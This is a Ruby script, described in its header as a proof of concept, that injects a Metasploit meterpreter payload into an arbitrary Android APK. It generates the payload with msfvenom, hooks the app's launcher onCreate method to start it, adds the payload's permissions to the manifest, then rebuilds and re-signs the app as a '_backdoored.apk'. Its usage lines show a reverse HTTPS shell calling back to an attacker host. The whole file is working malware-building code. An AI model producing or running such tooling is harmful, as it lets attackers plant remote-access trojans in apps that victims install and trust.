#!/usr/bin/env ruby
# This script is a POC for injecting metasploit payloads on 
# arbitrary APKs.
# Authored by timwr, Jack64
# Updated by xC0d3rZ
require 'nokogiri'
require 'fileutils'
require 'optparse'
require 'colorize'
require 'securerandom'
puts "
    ▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄  
  ▄█░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░▌ 
 ▐░░▌▐░░▌ ▀▀▀▀█░█▀▀▀▀ ▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀▀▀▀█░▌
  ▀▀ ▐░░▌     ▐░▌     ▐░▌          ▐░▌       ▐░▌
     ▐░░▌     ▐░▌     ▐░▌          ▐░█▄▄▄▄▄▄▄█░▌
     ▐░░▌     ▐░▌     ▐░▌          ▐░░░░░░░░░░▌ 
     ▐░░▌     ▐░▌     ▐░▌          ▐░█▀▀▀▀▀▀▀█░▌
     ▐░░▌     ▐░▌     ▐░▌          ▐░▌       ▐░▌
 ▄▄▄▄█░░█▄▄▄  ▐░▌     ▐░█▄▄▄▄▄▄▄▄▄ ▐░█▄▄▄▄▄▄▄█░▌
▐░░░░░░░░░░░▌ ▐░▌     ▐░░░░░░░░░░░▌▐░░░░░░░░░░▌ 
 ▀▀▀▀▀▀▀▀▀▀▀   ▀       ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀  
                                                 
".cyan
puts " " + "

 +-+-+-+-+-+-+-+-+ +-+-+-+-+".red + "
 |S|e|c|u|r|i|t|y| |T|e|a|m|".yellow + "
 +-+-+-+-+-+-+-+-+ +-+-+-+-+
".red  + "\n"

# Find the activity thatapk_backdoor.rb  is opened when you click the app icon
def findlauncheractivity(amanifest)
    package = amanifest.xpath("//manifest").first['package']
    activities = amanifest.xpath("//activity|//activity-alias")
    for activity in activities 
        activityname = activity.attribute("name")
        category = activity.search('category')
        unless category
            next
        end
        for cat in category
            categoryname = cat.attribute('name')
            if (categoryname.to_s == 'android.intent.category.LAUNCHER' || categoryname.to_s == 'android.intent.action.MAIN')
                activityname = activityname.to_s
                unless activityname.start_with?(package)
                    activityname = package + activityname
                end
                return activityname
            end
        end
    end
end
# If XML parsing of the manifest fails, recursively search
# the smali code for the onCreate() hook and let the user
# pick the injection point
def scrapeFilesForLauncherActivity()
	smali_files||=[]
	Dir.glob('original/smali*/**/*.smali') do |file|
	  checkFile=File.read(file)
	  if (checkFile.include?";->onCreate(Landroid/os/Bundle;)V")
		smali_files << file
		smalifile = file
		activitysmali = checkFile
	  end
	end
	i=0
	print "[*] Please choose from one of the following:\n"
	smali_files.each{|s_file|
		print "[+] Hook point ",i,": ",s_file,"\n"
		i+=1
	}
	hook=-1
	while (hook < 0 || hook>i)
		print "\nHook: "
		hook = STDIN.gets.chomp.to_i
	end
	i=0
	smalifile=""
	activitysmali=""
	smali_files.each{|s_file|
		if (i==hook)
			checkFile=File.read(s_file)
			smalifile=s_file
			activitysmali = checkFile
			break
		end
		i+=1
	}
	return [smalifile,activitysmali]
end

def fix_manifest(d_payload , d_original)
	payload_permissions=[]
	
	#Load payload's permissions
	File.open(d_payload+"/AndroidManifest.xml","r"){|file|
		k=File.read(file)
		payload_manifest=Nokogiri::XML(k)
		permissions = payload_manifest.xpath("//manifest/uses-permission")
		for permission in permissions
			name=permission.attribute("name")
			payload_permissions << name.to_s
		end
	#	print "#{k}"
	}
	original_permissions=[]
	apk_mani=''
	
	#Load original apk's permissions
	File.open(d_original+"/AndroidManifest.xml","r"){|file2|
		k=File.read(file2)
		apk_mani=k
		original_manifest=Nokogiri::XML(k)
		permissions = original_manifest.xpath("//manifest/uses-permission")
		for permission in permissions
			name=permission.attribute("name")
			original_permissions << name.to_s
		end
	#	print "#{k}"
	}
	#Get permissions that are not in original APK
	add_permissions=[]
	for permission in payload_permissions
		if !(original_permissions.include? permission)
			print "[*] Adding #{permission}\n"
			add_permissions << permission
		end
	end
	inject=0
	new_mani=""
	#Inject permissions in original APK's manifest
	for line in apk_mani.split("\n")
		if (line.include? "uses-permission" and inject==0)
			for permission in add_permissions
				new_mani << '<uses-permission android:name="'+permission+'"/>'+"\n"
			end
			new_mani << line+"\n"
			inject=1
		else
			new_mani << line+"\n"
		end
	end
	File.open(d_original+"/AndroidManifest.xml", "w") {|file| file.puts new_mani }
end
def randomString(size = 6)
  charset = %w{ 2 3 4 6 7 9 A C D E F G H J K M N P Q R T V W X Y Z}
  (0...size).map{ charset.to_a[rand(charset.size)] }.join
end
output_dir = "tmp/"+randomString(6)
apkfile = ARGV[0]
unless(apkfile || apkfile.length < 0)
    puts "[+] Usage: #{$0} {target.apk} [msfvenom options]".red + "\n"
	puts "[+] e.g. #{$0} messenger.apk -p android/meterpreter/reverse_https LHOST=192.168.1.1 LPORT=8443".cyan
	exit(1)
end
signapk = "embed_tools/signapk/signapk.jar"
unless(signapk && File.readable?(signapk))
	puts "[+] Cannot find signapk tool".red
	exit(1)
end
unless (File.readable?(apkfile))
	puts "[-] Cannot find #{apkfile}".red + "\n";
	exit(1);
end
apktool = "embed_tools/apktool.jar"
unless(apktool && File.readable?(apktool))
	puts "[+] Cannot find apktool tool".red
	exit(1)
end
apk_v= `embed_tools/apktool.sh -version`;
unless(apk_v.split()[0].include?("2."))
	puts "[-] Apktool version #{apk_v} not supported, please download the latest 2. version from git.\n".red
	exit(1)
end

begin
	msfvenom_opts = ARGV[1,ARGV.length]
	opts=""
	msfvenom_opts.each{|x|
	opts+=x
	opts+=" "
	}
rescue
	puts "Usage: #{$0} [target.apk] [msfvenom options]".green +"\n"
	puts "e.g. #{$0} messenger.apk -p android/meterpreter/reverse_https LHOST=192.168.1.1 LPORT=8443".cyan
	puts "[-] Error parsing msfvenom options. Exiting.".red + "\n"
	exit(1)
end
if (output_dir)
	 `mkdir #{output_dir}`
end
f_payload  = "#{output_dir}/payload.apk"
f_original = "#{output_dir}/original.apk"
f_signapk  = "#{output_dir}/signapk.apk"
d_payload  = "#{output_dir}/payload"
d_original = "#{output_dir}/original"
puts "[1] Generating msfvenom payload.." + f_payload
res=`msfvenom -f raw #{opts} -o #{f_payload} 2>&1`
if res.downcase.include?("invalid" || "error")
	puts res
	exit(1)
end

print "[*] Signing payload..\n"
`$(pwd)/embed_tools/signapk.sh #{f_payload} #{f_signapk}`

`cp #{apkfile} #{f_original}`

print "[*] Decompiling orignal APK..\n"
`$(pwd)/embed_tools/apktool.sh d #{f_original} -o #{d_original}`
print "[*] Decompiling payload APK..\n"
`$(pwd)/embed_tools/apktool.sh d #{f_signapk} -o #{d_payload}`
f = File.open(d_original+"/AndroidManifest.xml")
amanifest = Nokogiri::XML(f)
f.close
print "[*] Locating onCreate() hook..\n"
launcheractivity = findlauncheractivity(amanifest)
smalifile = d_original+'/smali/' + launcheractivity.gsub(/\./, "/") + '.smali'
begin
	activitysmali = File.read(smalifile)
rescue Errno::ENOENT
	print "[!] Unable to find correct hook automatically.\n"
	begin
		results=scrapeFilesForLauncherActivity()
		smalifile=results[0]
		activitysmali=results[1]
	rescue
		puts "[-] Error finding launcher activity. Exiting.".red +"\n"
		exit(1)
	end
end

print "[*] Copying payload files..\n"
FileUtils.mkdir_p("#{d_original}/smali/com/metasploit/stage/")
FileUtils.cp Dir.glob("#{d_payload}/smali/com/metasploit/stage/Payload*.smali"), "#{d_original}/smali/com/metasploit/stage/"
activitycreate = ';->onCreate(Landroid/os/Bundle;)V'
payloadhook = activitycreate + "\n    invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V"
hookedsmali = activitysmali.gsub(activitycreate, payloadhook)
print "[*] Loading ",smalifile," and injecting payload..\n"
File.open(smalifile, "w") {|file| file.puts hookedsmali }
injected_apk= "#{output_dir}/"+apkfile.split(".")[0]
injected_apk+="_backdoored.apk"
print "[*] Poisoning the manifest with meterpreter permissions..\n"
fix_manifest(d_payload,d_original)
print "[*] Rebuilding #{apkfile} with meterpreter injection as #{injected_apk}..\n"
`$(pwd)/embed_tools/apktool.sh b -o $(pwd)/#{injected_apk} #{d_original}`
print "[*] Signing #{injected_apk} ..\n"
`$(pwd)/embed_tools/signapk.sh #{injected_apk} $(pwd)/__{$apkfile}_backdoored.apk`
puts "[+] Infected file __{$apkfile}_backdoored.apk ready.\n"
